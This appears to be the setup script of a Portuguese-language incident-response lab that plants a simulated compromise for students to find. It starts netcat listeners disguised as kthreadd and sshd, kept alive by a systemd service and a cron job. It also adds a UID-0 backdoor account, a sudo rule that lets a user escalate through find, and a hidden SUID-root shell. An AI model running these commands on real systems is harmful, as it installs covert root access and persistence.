#!/usr/bin/env bash
source "$(dirname "$(readlink -f "$0")")/../../lib/common.sh"
require_root

OUT=/opt/course/10/q3
SVC=node-health
SVC_BIN=/var/lib/.cache/kthreadd
CRON_BIN=/dev/shm/.x/sshd
CRON_FILE=/etc/cron.d/logrotate-check
SUID_BIN=/var/tmp/.font-unix/dbus-launch
export DEBIAN_FRONTEND=noninteractive

# ---------- dependências ----------
if ! command -v nc.openbsd >/dev/null; then
  info "Instalando netcat-openbsd..."
  apt-get install -y -qq netcat-openbsd >/dev/null 2>&1
fi
SRC=$(readlink -f "$(command -v nc.openbsd)")
[ -x "$SRC" ] || { echo "Não foi possível instalar netcat-openbsd"; exit 1; }
if ! command -v cron >/dev/null; then
  info "Instalando cron..."
  apt-get install -y -qq cron >/dev/null 2>&1
fi
systemctl enable --now cron >/dev/null 2>&1

# ---------- limpeza de tentativas anteriores ----------
info "Limpando tentativas anteriores..."
systemctl disable --now "$SVC" >/dev/null 2>&1
rm -f "/etc/systemd/system/$SVC.service"
systemctl daemon-reload
rm -f "$CRON_FILE"
pkill -f "$SVC_BIN" 2>/dev/null; pkill -f "$CRON_BIN" 2>/dev/null; sleep 1
rm -rf /var/lib/.cache/kthreadd /dev/shm/.x /var/tmp/.font-unix
sed -i '/^sysbackup:/d' /etc/passwd /etc/shadow
id intern >/dev/null 2>&1 && userdel -r intern >/dev/null 2>&1
rm -f /etc/sudoers.d/50-intern
rm -rf "$OUT"; mkdir -p "$OUT"

# ---------- plantando o comprometimento ----------
info "Preparando cenário..."

# 1) serviço que se reinicia sozinho, binário escondido
mkdir -p /var/lib/.cache
cp "$SRC" "$SVC_BIN"; chmod 755 "$SVC_BIN"
cat > "/etc/systemd/system/$SVC.service" <<EOF
[Unit]
Description=Node health reporter
After=network-online.target

[Service]
ExecStart=$SVC_BIN -dlk 31337
Restart=always
RestartSec=2

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now "$SVC" >/dev/null 2>&1

# 2) processo respawnado via cron, binário em tmpfs
mkdir -p /dev/shm/.x
cp "$SRC" "$CRON_BIN"; chmod 755 "$CRON_BIN"
cat > "$CRON_FILE" <<EOF
# rotate check
* * * * * root ss -ltn | grep -q ':4444 ' || setsid $CRON_BIN -dlk 4444 >/dev/null 2>&1 < /dev/null &
EOF
chmod 644 "$CRON_FILE"
setsid nohup "$CRON_BIN" -dlk 4444 >/dev/null 2>&1 < /dev/null &

# 3) conta "backdoor" com UID 0
echo 'sysbackup:x:0:0:system backup:/root:/bin/bash' >> /etc/passwd
grep -q '^sysbackup:' /etc/shadow || echo 'sysbackup:*:19800:0:99999:7:::' >> /etc/shadow

# 4) usuário com sudo indevido (find permite escalar para root)
useradd -m -s /bin/bash intern
echo 'intern ALL=(root) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/50-intern
chmod 440 /etc/sudoers.d/50-intern

# 5) shell SUID-root escondido
mkdir -p /var/tmp/.font-unix
cp /bin/bash "$SUID_BIN"; chmod 4755 "$SUID_BIN"

sleep 2
ss -ltn | grep -q ':31337 ' && ss -ltn | grep -q ':4444 ' || { echo "falha ao iniciar o cenário"; exit 1; }

echo
ok "Ambiente pronto! Leia o enunciado.md"
